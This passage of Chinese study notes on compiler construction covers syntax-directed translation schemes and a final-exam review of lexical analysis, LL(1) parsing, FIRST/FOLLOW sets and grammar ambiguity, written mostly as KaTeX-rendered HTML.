xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>本身的属性</li></ol></li></ul></li></ul><h3 id="sdt-%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91%E6%96%B9%E6%A1%88" tabindex="-1">SDT 语法制导翻译方案</h3><p>SDD：只给出了语义规则(属性计算的定义)，并没有给出计算的次序，所以要通过依赖图寻求计算顺序</p><p>SDT：既有关于属性计算的定义，又有计算的次序<br>SDT将语义动作用花括号括起来，作为一种程序片段，插入到产生式右部的合适位置</p><ul><li><p>设计翻译模式的原则：必须保证某个语义动作引用一个属性时，该属性已经被定义了</p><ol><li>当语义规则只引用综合属性是，将动作放到产生式末尾</li><li>当语义规则中有继承属性，也有继承属性时<ol><li>产生式右部的符号的继承属性必须在符号之前计算出来</li><li>一个动作不能引用这个动作右边的符号的属性</li><li>产生式左部的综合属性只有在它所引用的所有属性都计算出来后才能计算，一般动作放在最右部</li></ol></li></ol></li><li><p>SDT实现了语法分析和语义分析同时进行，基于自下而上的语法分析方式</p></li><li><p>语法分析能得到语法树</p><ul><li>仅指明各个文法符号之间的传递关系</li><li>不能决定文法符号间应该有什么样的运算，这是由语义分析决定的</li></ul></li></ul><h2 id="%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0" tabindex="-1">期末复习</h2><p><a href="https://www.bilibili.com/video/BV1SB4y1S7Sc/?p=4&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">跌的视频</a><br>共7道</p><h3 id="%E7%AC%AC%E4%B8%80%E9%81%93-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第一道 词法分析</h3><ol><li>求NFA接受字符串的过程</li><li>NFA转DFA，并画出状态转换图</li><li>DFA的最小化</li><li>自然语言描述NFA的语言</li><li>NFA/DFA转正规表达式</li></ol><h3 id="%E7%AC%AC%E4%BA%8C%E9%81%93-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">第二道 自上而下语法分析</h3><ol><li><p>最左推导</p><ol><li>总是选择每个句型最左边的非终结字符进行替换</li></ol></li><li><p>消除左递归</p><ol><li>先消除间接左递归</li><li>再消除直接左递归</li></ol></li><li><p>求FIRST，FOLLOW集合</p><ul><li>计算FOLLOW集合<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>的求法，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>S</mi><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mo>…</mo><mi>U</mi><mi>a</mi><mo>…</mo><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)=\{a|S\rightarrow^{*}\dots Ua\dots,a\in V_T\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>,该定义中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>必须从S推得才能有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mtext>集合</mtext></mrow><annotation encoding="application/x-tex">FOLLOW集合</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">集合</span></span></span></span></eq></li><li><ol><li>对于文法的开始/识别符号S，令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\$\in FOLLOW(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>$ A \rightarrow \alpha B \beta <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则，</mtext></mrow><annotation encoding="application/x-tex">则，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">则，</span></span></span></span></eq>FIRST(\beta)<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中的非</mtext></mrow><annotation encoding="application/x-tex">中的非</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">中的非</span></span></span></span></eq>\epsilon<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>元素属于</mtext></mrow><annotation encoding="application/x-tex">元素属于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">元素属于</span></span></span></span></eq>FOLLOW(B)$</li></ol></li><li><ol start="3"><li>$ A \rightarrow \alpha B <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: ，或 $̲A\rightarrow \a…" style="color:#cc0000"><span class="cjk_fallback">，或 $A\rightarrow \alpha B \beta</span></span></eq>，而 $ FIRST(\beta) <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: 含有 $̲ \epsilon $ ，则" style="color:#cc0000"><span class="cjk_fallback">含有 $ \epsilon $ ，则</span></span></eq> FOLLOW(A) $ 的元素属于$ FOLLOW(B) $</li></ol></li></ul></li></ul></li><li><p>构造LL(1)分析表</p></li></ol><ul><li>分析表的构造<br>对于产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></eq><ul><li><ol><li>对<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>中的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>,置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,a]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>,则对于属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi></mrow><annotation encoding="application/x-tex">\$</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span></span></span></span></eq>,分别置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,b]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,\$]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">$</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li></ul></li></ul><ol start="5"><li>给出分析过程</li></ol><ul><li><p>使用分析表的分析过程</p><table><thead><tr><th>符号栈</th><th>输入串</th><th>分析和动作</th></tr></thead><tbody><tr><td>E$</td><td>id + id * id$</td><td></td></tr><tr><td>…</td><td>…</td><td>…</td></tr></tbody></table></li></ul><h3 id="%E7%AC%AC%E4%B8%89%E9%81%93-%E6%B6%88%E9%99%A4%E6%96%87%E6%B3%95%E4%BA%8C%E4%B9%89%E6%80%A7" tabindex="-1">第三道 消除文法二义性</h3><ol><li>说明二义文法</li></ol><ul><li>文法对同一语句产生不同的语法树，则文法是二义的</li><li>二义性产生原因<ul><li>左右结合性<ul><li>问题：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">id+id+id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>，会产生两个语法树<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>（</mtext><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mtext>）</mtext><mo>+</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">（id+id）+id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">）</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mtext>（</mtext><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mtext>）</mtext></mrow><annotation encoding="application/x-tex">id+（id+id）</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">）</span></span></span></span></eq>，这里两个树不同的是扩展方向</li><li>解决:<ul><li>左结合：将可以递归的非终结符放在终结符的左侧，使运算具有左结合性</li><li>右结合同</li></ul></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E+E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>改为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>F</mi><mi mathvariant="normal">∣</mi><mi>F</mi><mo separator="true">,</mo><mi>F</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E+F|F,F\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>,这样就是左结合</li></ul></li><li>优先级：某个算符所在语法树层数越高，越先被运算，这种算符的优先级越高<ul><li>问题： <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>→</mo><mi>E</mi><mo>+</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>E</mi><mo>∗</mo><mi>E</mi><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">E\rightarrow E +E | E*E|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span></span></span></span></eq>在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mo>+</mo><mi>i</mi><mi>d</mi><mo>∗</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">id+id*id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">i</span><span 